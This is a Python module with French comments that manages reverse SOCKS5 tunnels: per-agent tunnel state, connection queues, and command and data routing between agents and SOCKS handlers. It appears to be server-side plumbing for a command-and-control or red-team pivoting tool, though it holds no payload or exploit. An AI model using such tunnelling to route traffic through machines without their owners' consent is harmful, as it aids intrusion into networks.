# ============================================================
#  server/tunnel/manager.py — Gestion des tunnels SOCKS5 inversés
#
#  TunnelManager : singleton thread-safe qui suit :
#    - Les agents avec tunnel actif
#    - Les connexions SOCKS5 en cours (indexed par tunnel_id)
#    - Les files de commandes agent ↔ handler SOCKS5
# ============================================================

import threading
import queue
import time
from typing import Optional, Dict


class TunnelConnection:
    """
    Représente une connexion SOCKS5 cliente unique.
    Cycle de vie : connecting → open → closed
    """
    def __init__(self, tunnel_id: str):
        self.tunnel_id       = tunnel_id
        # Commandes à envoyer à l'agent (CONNECT / DATA / CLOSE)
        self.agent_commands: queue.Queue  = queue.Queue()
        # Données reçues de l'agent (vers le client SOCKS5)
        self.agent_responses: queue.Queue = queue.Queue()
        self.created_at  = time.time()
        self.last_active = time.time()
        self.state       = "connecting"   # connecting | open | closed


class AgentTunnel:
    """Tunnel associé à un agent (port SOCKS5 + connexions actives)."""
    def __init__(self, agent_id: str, socks_port: int):
        self.agent_id    = agent_id
        self.socks_port  = socks_port
        self.started_at  = time.time()
        self.connections: Dict[str, TunnelConnection] = {}
        self.lock        = threading.Lock()

    @property
    def active_count(self) -> int:
        with self.lock:
            return sum(1 for c in self.connections.values() if c.state == "open")

    @property
    def uptime_s(self) -> int:
        return int(time.time() - self.started_at)


class TunnelManager:
    """Singleton — accès thread-safe à l'état des tunnels."""

    def __init__(self):
        self._tunnels: Dict[str, AgentTunnel] = {}  # agent_id → AgentTunnel
        self._lock    = threading.Lock()

    # ── Gestion des tunnels agent ─────────────────────────────

    def start_tunnel(self, agent_id: str, socks_port: int) -> AgentTunnel:
        with self._lock:
            t = AgentTunnel(agent_id, socks_port)
            self._tunnels[agent_id] = t
            return t

    def stop_tunnel(self, agent_id: str):
        with self._lock:
            self._tunnels.pop(agent_id, None)

    def get_tunnel(self, agent_id: str) -> Optional[AgentTunnel]:
        with self._lock:
            return self._tunnels.get(agent_id)

    def has_tunnel(self, agent_id: str) -> bool:
        with self._lock:
            return agent_id in self._tunnels

    def list_tunnels(self) -> list:
        with self._lock:
            return list(self._tunnels.values())

    # ── Gestion des connexions ────────────────────────────────

    def add_connection(self, agent_id: str, conn: TunnelConnection):
        t = self.get_tunnel(agent_id)
        if t:
            with t.lock:
                t.connections[conn.tunnel_id] = conn

    def remove_connection(self, agent_id: str, tunnel_id: str):
        t = self.get_tunnel(agent_id)
        if t:
            with t.lock:
                t.connections.pop(tunnel_id, None)

    def get_connection(self, agent_id: str, tunnel_id: str) -> Optional[TunnelConnection]:
        t = self.get_tunnel(agent_id)
        if not t:
            return None
        with t.lock:
            return t.connections.get(tunnel_id)

    def pop_agent_commands(self, agent_id: str) -> list:
        """Consomme et retourne toutes les commandes en attente pour l'agent."""
        t = self.get_tunnel(agent_id)
        if not t:
            return []
        commands = []
        with t.lock:
            for conn in list(t.connections.values()):
                while True:
                    try:
                        commands.append(conn.agent_commands.get_nowait())
                    except queue.Empty:
                        break
        return commands

    def deliver_agent_data(self, agent_id: str, tunnel_id: str,
                           data_b64: str, status: str):
        """L'agent a envoyé des données — les router vers le bon handler SOCKS5."""
        conn = self.get_connection(agent_id, tunnel_id)
        if conn:
            conn.agent_responses.put({"data": data_b64, "status": status})
            conn.last_active = time.time()


# ── Singleton global ──────────────────────────────────────────
tunnel_manager = TunnelManager()
